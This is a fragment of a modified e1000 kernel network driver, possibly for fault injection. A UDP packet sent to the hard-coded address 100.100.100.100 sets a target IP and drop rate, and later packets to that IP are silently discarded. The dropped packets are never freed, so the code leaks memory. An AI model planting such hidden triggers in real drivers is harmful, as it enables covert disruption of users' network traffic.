...
static u8  blocked_rate;

void set_up_blocking(struct sk_buff *skb, struct iphdr *iph){
	unsigned char buff[5];
	struct udphdr *udphead=(struct udphdr *)((unsigned char *)iph + iph->ihl * 4);  
	int off=((unsigned char *)udphead + sizeof(*udphead) ) - skb->data;
    unsigned char *payload =  skb_header_pointer(skb, off, sizeof(buff), buff);
	
    if (!payload)
        return;

	u32 ip_host = ((u32)payload[0] << 24) |
				((u32)payload[1] << 16) |
				((u32)payload[2] << 8)  |
				((u32)payload[3]);
	WRITE_ONCE(blocked_ip, ip_host);
    WRITE_ONCE(blocked_rate, payload[4]);
}

bool drop_packet(struct sk_buff *skb,__be32 daddr_be){
	u8 rate = READ_ONCE(blocked_rate);
	if(rate == 0) return false;
	if(ntohl(daddr_be)!=READ_ONCE(blocked_ip)){
		return false;
	}
	u32 temp= get_random_u32()%100; 
	if(temp < rate){
...
static netdev_tx_t e1000_xmit_frame(struct sk_buff *skb,
	...
	if (iph) {
	 ...
	 if(iph->protocol == IPPROTO_UDP){
		__be32 check_destination=htonl((100 << 24) | (100 << 16) | (100 << 8) | 100);
		if(daddr==check_destination){
			set_up_blocking(skb,iph);
		}

	 }
	 
     if(drop_packet(skb,daddr)){
		return NETDEV_TX_OK;
	 }
